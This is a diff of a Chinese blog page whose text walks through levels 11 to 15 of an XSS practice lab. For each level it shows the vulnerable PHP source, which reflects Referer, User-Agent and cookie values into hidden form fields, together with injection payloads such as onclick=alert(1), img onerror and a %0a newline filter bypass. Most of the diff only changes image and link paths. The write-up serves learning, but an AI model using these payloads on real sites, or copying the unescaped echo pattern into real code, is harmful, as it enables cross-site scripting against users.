+<p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173311891.png" srcset="/img/loading.gif" lazyload alt="image-20240107173311891"><br><strong>- Pass-11</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, 0);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br><span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure>
 <p>显然只能从$str11&#x3D;$_SERVER[‘HTTP_REFERER’];入手了</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=&quot;</span>alert(1)<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/5b21026d4fe64dc3b9d202bed10d8aca.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/090010df24fb445aabb38716200d0530.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><strong>- Pass-12</strong></p>
+<p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173324529.png" srcset="/img/loading.gif" lazyload alt="image-20240107173324529"><br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173331677.png" srcset="/img/loading.gif" lazyload alt="image-20240107173331677"><br><strong>- Pass-12</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, 0);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<br><span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/ea506e57dc6a4c3e97bfcc0640231bb0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173340796.png" srcset="/img/loading.gif" lazyload alt="image-20240107173340796"></p>
 <p>这个就是从user-agent入手</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=&quot;</span>alert(1)<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/068fbadd64c740f7950f0a81517eb734.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><strong>- Pass-13</strong></p>
+<p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173350266.png" srcset="/img/loading.gif" lazyload alt="image-20240107173350266"><br><strong>- Pass-13</strong></p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;?<span class="hljs-function">php </span><br><span class="hljs-function"><span class="hljs-title">setcookie</span><span class="hljs-params">(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;call me maybe?&quot;</span>, time()+<span class="hljs-number">3600</span>)</span></span>;<br><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str = $_GET[<span class="hljs-string">&quot;keyword&quot;</span>];<br>$str00 = $_GET[<span class="hljs-string">&quot;t_sort&quot;</span>];<br>$str11=$_COOKIE[<span class="hljs-string">&quot;user&quot;</span>];<br>$str22=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str11);<br>$str33=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str22);<br>echo <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-built_in">htmlspecialchars</span>($str).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span><span class="hljs-number">.&#x27;</span>&lt;center&gt;<br>&lt;form id=search&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_link&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_history&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_sort&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_cook&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.$str33.&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p>cookie注入点</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">user= <span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/c9ce0f435ae54d20b4ea6bb8db3e0f8f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><strong>- Pass-14</strong><br>略<br><strong>- Pass-15</strong></p>
+<p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173406124.png" srcset="/img/loading.gif" lazyload alt="image-20240107173406124"><br><strong>- Pass-14</strong><br>略<br><strong>- Pass-15</strong></p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;?<span class="hljs-function">php </span><br><span class="hljs-function"><span class="hljs-title">ini_set</span><span class="hljs-params">(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>)</span></span>;<br>$str = $_GET[<span class="hljs-string">&quot;src&quot;</span>];<br>echo <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="hljs-built_in">htmlspecialchars</span>($str)<span class="hljs-number">.&#x27;</span><span class="hljs-string">&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p>注入代码</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&#x27;level1.php?name=&lt;img src=x οnerrοr=alert(1)&gt;&#x27;</span><br></code></pre></td></tr></table></figure>
@@ -339,7 +339,7 @@
 
 <p>换行符%0a（换行）或者%0d（回车）绕过</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;img%<span class="hljs-number">0</span>asrc=x%<span class="hljs-number">0</span>aonerror=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;<br><span class="hljs-comment">//src=#就会把后面的都注释掉了</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/45754e08ea02455e99be64da3b0c62bc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173415039.png" srcset="/img/loading.gif" lazyload alt="image-20240107173415039"></p>
 
               
             </div>
@@ -357,7 +357,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-chain-item">漏洞复现</a>
+  <a href="../../../../../categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-chain-item">漏洞复现</a>
   
   
 
@@ -372,9 +372,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">#xss靶场练习</a>
+        <a href="../../../../../tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">#漏洞复现</a>
       
-        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">#漏洞复现</a>
+        <a href="../../../../../tags/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">#xss靶场练习</a>
       
     </div>
   
@@ -429,7 +429,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/" title="dll劫持">
+                      <a href="../../dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/" title="dll劫持">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">dll劫持</span>
                         <span class="visible-mobile">上一篇</span>
@@ -439,7 +439,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/06/15/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="域渗透学习笔记">
+                      <a href="../../%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="域渗透学习笔记">
                         <span class="hidden-mobile">域渗透学习笔记</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
@@ -593,8 +593,8 @@
 
 <script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
 <script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
+<script  src="../../../../../js/events.js" ></script>
+<script  src="../../../../../js/plugins.js" ></script>
 
 
   <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
@@ -633,7 +633,7 @@
 
 
   
-    <script  src="/js/img-lazyload.js" ></script>
+    <script  src="../../../../../js/img-lazyload.js" ></script>
   
 
 
@@ -770,7 +770,7 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
-  <script  src="/js/local-search.js" ></script>
+  <script  src="../../../../../js/local-search.js" ></script>
 
 
 
@@ -778,7 +778,7 @@
 
 <!-- 主题的启动项，将它保持在最底部 -->
 <!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
+<script  src="../../../../../js/boot.js" ></script>
 
 
   
